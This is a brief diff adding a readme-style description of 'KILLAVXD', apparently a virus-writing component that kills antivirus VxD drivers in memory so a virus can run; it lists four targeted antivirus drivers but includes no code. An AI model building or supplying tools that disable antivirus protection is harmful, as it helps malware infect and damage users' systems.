@@ -1,0 +1,11 @@
+
+ KILLAVXD
+ ~~~~~~~~
+
+ - AV VxDs in-memory killer
+ - allows normal virus execution even if av vxds are active
+
+ - spider.vxd
+ - avp95.vxd
+ - gk95.vxd
+ - avpguard.vxd
